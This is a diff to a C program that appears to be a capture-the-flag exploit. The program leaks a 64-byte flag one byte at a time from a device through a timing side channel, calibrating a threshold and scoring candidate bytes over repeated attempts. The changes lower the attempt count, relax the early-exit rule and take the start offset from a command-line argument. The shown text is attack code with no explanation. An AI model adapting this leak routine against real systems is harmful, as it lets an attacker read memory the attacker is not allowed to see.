@@ -19,8 +19,7 @@
 #define SHMEM_SIZE 0x100000UL
 #define PAGE_SIZE 0x1000UL
 #define NUM_PAGES 256
-#define ATTEMPTS 1000
-#define FLAG_OFFSET 0
+#define ATTEMPTS 100
 
 static volatile unsigned char *shared_mem;
 
@@ -183,10 +182,10 @@ static unsigned char leak_byte(int fd, int target, uint64_t threshold)
         printf("[%.3fs] target=%-2d best=0x%02x ('%c') score=%u/%u\n",
                elapsed_s, target, best, best,
                scores[best], ATTEMPTS);
-        if (++rounds[best] >= 3)
-            return best;
-
         clock_gettime(CLOCK_MONOTONIC, &t0);
+
+        if (++rounds[best] >= 2)
+            return best;
     }
 }
 
@@ -205,8 +204,12 @@ static int open_device(void)
     return fd;
 }
 
-int main(void)
+int main(int argc, char *argv[])
 {
+    unsigned flag_offset = 0;
+    if (argc > 1)
+        flag_offset = (unsigned)atoi(argv[1]);
+
     int fd = open_device();
     if (fd < 0)
         return 1;
@@ -215,7 +218,7 @@ int main(void)
     size_t len = 0;
 
     uint64_t threshold = calibrate_threshold();
-    for (unsigned target = FLAG_OFFSET; target < FLAG_OFFSET + 64; ++target)
+    for (unsigned target = flag_offset; target < flag_offset + 64; ++target)
     {
         flag[len++] = leak_byte(fd, target, threshold);
         flag[len] = '\0';
